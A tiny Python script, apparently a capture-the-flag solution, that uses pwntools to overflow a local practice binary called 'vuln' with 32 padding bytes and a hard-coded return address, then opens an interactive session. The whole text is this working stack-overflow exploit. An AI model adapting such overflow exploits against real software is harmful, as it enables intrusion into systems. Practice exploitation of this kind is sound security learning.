# import pwn library
from pwn import *
p=process('./vuln')
# initialising payload
payload=""
payload+="A"*32
payload+=p32(0x0804849d)
p.sendline(payload)
p.interactive()
